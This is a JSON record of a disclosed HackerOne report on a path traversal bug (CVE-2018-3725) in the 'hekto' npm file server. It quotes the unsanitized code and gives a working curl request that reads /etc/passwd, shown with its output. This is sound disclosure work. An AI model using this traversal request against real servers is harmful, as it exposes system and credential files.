{
  "id": 311218,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTEyMTg=",
  "url": "https://hackerone.com/reports/311218",
  "title": "[hekto] Path Traversal vulnerability allows to read content of arbitrary files",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-01-31T23:18:19.644Z",
  "submitted_at": "2018-01-31T23:18:19.644Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3725"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-02-26T22:10:49.295Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-02-26T22:10:40.675Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal vulnerability in hekto module, which allows to read arbitrary file from the remote server.\n\n## Module\n\n**hekto**\n\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\n\nhttps://www.npmjs.com/package/hekto\n\nversion: 0.2.0\n\nStats\n0 downloads in the last day\n7 downloads in the last week\n36 downloads in the last month\n\n~420 estimated downloads per year\n\n\n## Description\n\nThis vulnerability exists, because there is no sanitization of path of requested file. In line 80 (index.js) ```file``` is set:\n\n```javascript\n// node_modules/hekto/bin/hekto.js line 80:\n    let file = path.join(process.cwd(), argDir, this.request.url);\n```\n\nThen, this variable is used \"as is\" in code which reads file from the server:\n\n```javascript\n// node_modules/hekto/bin/hekto.js line 126:\n\n    // if `file` is a file\n    if (fs.lstatSync(file).isFile()) {\n        this.status = 200;\n\n        if (path.extname(file) == '.html') {\n            this.type = 'text/html';\n            this.body = fs.createReadStream(file);\n        } else if (path.extname(file) == '.css') {\n            this.type = 'text/css';\n            this.body = fs.createReadStream(file);\n        } else {\n            const fileBuffer = readChunk.sync(file, 0, 4100);\n            const mime = fileType(fileBuffer);\n\n            if (mime) {\n                this.type = mime.mime + '; charset=utf-8';\n            } else {\n                this.type = 'text/plain; charset=utf-8';\n            }\n\n            this.body = fs.createReadStream(file);\n        }\n    }\n```\n\n## Steps To Reproduce:\n\n- install ```hekto``` module\n\n```\n$ npm install hekto\n```\n\n- run server from command line:\n\n```\n$ ./node_modules/hekto/bin/hekto.js serve\n\nServing on port 3000\n\n```\n\n- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd\n```\n\nResult:\n\n```\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 3000 (#0)\n> GET /../../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:3000\n> User-Agent: curl/7.54.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Vary: Accept-Encoding\n< X-Powered-By: Hekto\n< Content-Type: text/plain; charset=utf-8\n< Date: Wed, 31 Jan 2018 23:08:42 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n<\n##\n# User Database\n#\n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\n(...)\n```\n\n## Supporting Material/References:\n\nConfiguration:\n\n- macOS 10.13.3\n- Chromium 66.0.3331.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.3\n- npm version: 5.5.1\n- curl 7.54.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability can be used to read content of any file from remote server where hekto is run.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-03-28T22:10:40.814Z",
  "allow_singular_disclosure_after": -185554044.92484993,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "jokebookservice1",
    "muon4",
    "ysx",
    "apapedulimu",
    "dudez",
    "eveeez",
    "13ern",
    "sa1tama0",
    "khaledibnalwalid",
    "cr4xerbik4sh",
    "and 2 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5778,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "hekto",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
